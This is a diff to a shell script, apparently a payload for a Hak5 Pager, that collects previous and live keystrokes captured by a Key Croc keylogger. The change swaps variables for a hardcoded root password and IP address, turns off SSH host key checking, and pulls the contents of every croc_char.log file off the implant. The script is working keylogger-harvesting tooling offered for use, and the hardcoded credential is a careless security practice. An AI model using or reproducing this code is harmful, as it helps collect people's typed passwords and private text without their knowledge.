@@ -3,7 +3,7 @@
 # Title:  Pager_keystrokes
 # Author: spywill
 # Description: Read previous and live keystrokes from your Keycroc
-# Version: 1.1
+# Version: 1.2
 
 trap 'exit 0' INT TERM EXIT
 remote_file="/root/loot/croc_char.log"
@@ -119,8 +119,17 @@ case "$resp" in
 	$DUCKYSCRIPT_USER_CONFIRMED)
 		LOG green "Previous keystrokes (croc_char.log)"
 		spinnerid=$(START_SPINNER "Collecting keystroke...")
-		OUTPUT=$(sshpass -p "$croc_passwd" ssh -o StrictHostKeyChecking=no root@$croc_ip \
-		'find / -type f -name "croc_char.log" -exec sh -c "cat \"\$@\"" _ {} +')
+		OUTPUT=$(sshpass -p "cody1975" ssh -o StrictHostKeyChecking=no root@172.16.42.206 "
+		find / -type f -name 'croc_char.log' 2>/dev/null -exec sh -c '
+		for file do
+			chars=\$(wc -m < \"\$file\")
+			echo \"File: \$file\"
+			echo \"number of char: \$chars\"
+			echo \"------------------------\"
+			strings \"\$file\"
+			echo
+		done
+		' sh {} +")
 		echo "$OUTPUT" > $SAVE_KEYSTROKE
 		LOG $(cat $SAVE_KEYSTROKE)
 		STOP_SPINNER ${spinnerid}
